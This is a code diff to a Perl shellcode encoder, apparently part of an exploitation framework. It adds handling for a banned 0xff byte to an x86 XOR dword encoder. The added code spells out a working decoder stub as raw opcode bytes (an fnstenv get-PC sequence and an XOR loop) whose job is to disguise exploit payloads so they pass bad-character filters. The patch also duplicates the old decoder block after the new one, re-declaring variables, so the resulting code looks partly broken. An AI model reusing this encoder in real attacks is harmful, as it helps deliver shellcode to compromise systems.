@@ -30,6 +30,7 @@ sub Encode
     my ($rawshell, $xbadc) = @_;
         
     my $xorkey = XorKeyScanDword($rawshell, $xbadc);
+    
     if (! $xorkey)
     {
         print "Could not locate valid xor key\n";
@@ -37,7 +38,7 @@ sub Encode
     }
     
     my $xordat = XorDword($xorkey, $rawshell);
-    my $encode = XorDecoderDword("x86", $xorkey, length($xordat));
+    my $encode = XorDecoderDword("x86", $xorkey, length($xordat), $xbadc);
 
     my $shellcode = $encode . $xordat;
 
@@ -64,13 +65,74 @@ sub Encode
 #
 
 sub XorDecoderDword {
-    my ($arch, $xor, $len) = @_;
+    my ($arch, $xor, $len, $xbadc) = @_;
     if(! $len) { $len = 0x200 }
 
-    # this xor decoder was written by spoonm[at]ghettohackers.net
+    
     if (lc($arch) eq "x86")
     {
-	my $smallVersion = 0;
+    
+        # this xor decoder was written by spoonm[at]ghettohackers.net
+	    my $smallVersion = 0;
+        # Pad to a 4 byte boundary, the xor data should already be padded
+        # but just incase.
+        my $loopCounter = int(($len - 1) / 4) + 1;
+        $loopCounter *= -1;
+
+        my $xorlen = pack("L", $loopCounter);
+        my $xorkey = pack("L", $xor);
+        
+        # this anti-0xff encoder written by hdm[at]metasploit.com
+        if (index($xbadc, "\xff") != -1)
+        {
+
+            # try sub len, then add len
+            my $loopmode = "sub";
+            my $lenops = "\x66\x81\xe9";
+            $xorlen = pack("S", $loopCounter);
+            
+            if ($xorlen =~ /\x00|\xff/)
+            {
+                $xorlen = pack("S", abs($loopCounter));
+                $lenops = "\x66\x81\xc1";
+                $loopmode = "add";
+            }
+            
+            if ($xorlen =~ /\x00|\xff/ && $loopCounter < 128)
+            {
+                $xorlen = chr(abs($loopCounter)) . "\x59\x90\x90";
+                $lenops = "\x6a";
+                $loopmode = "push";
+            }
+            
+            if ($xorlen !~ /\x00|\xff/)
+            {
+                my $decoder = 
+                "\xd9\xe1".                 # fabs
+                "\xd9\x34\x24".             # fnstenv (%esp,1)
+                "\x5b".                     # pop    %ebx
+                "\x5b".                     # pop    %ebx
+                "\x5b".                     # pop    %ebx
+                "\x5b".                     # pop    %ebx
+                "\x80\xc3\x1f".             # add    $0x1f,%bl
+                "\x31\xc9".                 # xor    %ecx,%ecx
+                $lenops . $xorlen.          # stick loop cnt into ecx
+                "\x81\x33" .$xorkey.        # xorl   $0x69696969,(%ebx)
+                "\x43".                     # inc    %ebx
+                "\x43".                     # inc    %ebx
+                "\x43".                     # inc    %ebx
+                "\x43".                     # inc    %ebx
+                "\xe2\xf4";                 # loop   a0000013 <_start+0x13>
+                return $decoder;
+            }
+            
+            # Fuck!
+        } 
+    
+    
+    
+        # this xor decoder was written by spoonm[at]ghettohackers.net
+	    my $smallVersion = 0;
         # Pad to a 4 byte boundary, the xor data should already be padded
         # but just incase.
         my $loopCounter = int(($len - 1) / 4) + 1;
